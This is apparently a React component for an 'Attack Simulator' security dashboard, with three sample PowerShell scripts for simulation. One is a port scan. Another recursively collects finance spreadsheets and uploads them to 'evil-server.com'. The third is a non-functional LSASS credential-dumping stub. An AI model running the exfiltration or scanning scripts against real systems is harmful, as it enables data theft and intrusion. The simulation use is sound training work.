'use client';
import { useState } from 'react';
import { Card, CardHeader, CardTitle, CardContent, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { useAttackSimulation } from '@/context/attack-simulation-context';
import { Loader2, FileText } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

const sampleScripts = [
    {
        name: "Simple Port Scan",
        script: `
# Simple Port Scan
$target = "10.0.1.25"
$ports = 1..1024

foreach ($port in $ports) {
    Test-NetConnection -ComputerName $target -Port $port -InformationLevel "Quiet"
    if ($?) {
        Write-Host "Port $port is open on $target"
    }
}
Write-Host "Port scan complete."
`
    },
    {
        name: "Data Exfiltration",
        script: `
# Find and upload sensitive files
$sourceDir = "C:\\Users\\Finance\\Documents\\"
$files = Get-ChildItem -Path $sourceDir -Include *.xlsx, *.csv -Recurse
$destination = "http://evil-server.com/upload"

foreach ($file in $files) {
    try {
        Invoke-RestMethod -Uri $destination -Method Post -InFile $file.FullName
        Write-Host "Uploaded $($file.Name)"
    } catch {
        Write-Host "Failed to upload $($file.Name)"
    }
}
`
    },
    {
        name: "Credential Dumping",
        script: `
# Mimikatz-like behavior to dump credentials from memory
# This is a conceptual script
function Get-LsassProcess {
    return Get-Process -Name lsass
}

$lsass = Get-LsassProcess
if ($lsass) {
    $handle = $lsass.Handle
    # In a real attack, would use handle to read memory
    Write-Host "Access gained to LSASS process (PID: $($lsass.Id))."
    Write-Host "Simulating credential extraction..."
    Start-Sleep -Seconds 2
    Write-Host "SAM, SECURITY, and SYSTEM hives targeted."
} else {
    Write-Host "LSASS process not found."
}
`
    }
];

export function PowerShellSimulator() {
    const { runAttack, loading } = useAttackSimulation();
    const [scriptContent, setScriptContent] = useState(sampleScripts[0].script.trim());
    const { toast } = useToast();

    const handleRunSimulation = () => {
        if (!scriptContent.trim()) {
            toast({
                variant: 'destructive',
                title: 'Error',
                description: 'Script content cannot be empty.',
            });
            return;
        }
        runAttack(scriptContent);
    };
    
    return (
        <main className="flex flex-1 flex-col gap-4 p-4 md:gap-8 md:p-8">
            <header>
                <h1 className="text-3xl font-bold tracking-tight">Attack Simulator</h1>
                <p className="text-muted-foreground">
                    Simulate an attack by providing a script for the AI to analyze and execute in a virtual environment.
                </p>
            </header>
            <Card>
                <CardHeader>
                    <CardTitle>Script-based Simulation</CardTitle>
                    <CardDescription>
                        Paste a script below or select a sample. The AI will analyze its intent and generate a full simulation across the dashboard.
                    </CardDescription>
                </CardHeader>
                <CardContent>
                    <div className="mb-4">
                        <h4 className="text-sm font-medium mb-2">Sample Scripts</h4>
                        <div className="flex flex-wrap gap-2">
                            {sampleScripts.map(sample => (
                                <Button
                                    key={sample.name}
                                    variant="outline"
                                    size="sm"
                                    onClick={() => setScriptContent(sample.script.trim())}
                                >
                                    <FileText className="mr-2 h-4 w-4" />
                                    {sample.name}
                                </Button>
                            ))}
                        </div>
                    </div>
                    
                    <Textarea 
                        placeholder="Paste your PowerShell or shell script here..."
                        className="h-64 font-mono text-xs"
                        value={scriptContent}
                        onChange={(e) => setScriptContent(e.target.value)}
                    />
                     <div className="flex w-full items-center justify-end mt-6">
                        <Button 
                            onClick={handleRunSimulation} 
                            disabled={loading}
                            size="lg"
                        >
                            {loading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                            {loading ? 'Simulating...' : 'Run Simulation'}
                        </Button>
                    </div>
                </CardContent>
            </Card>
        </main>
    )
}
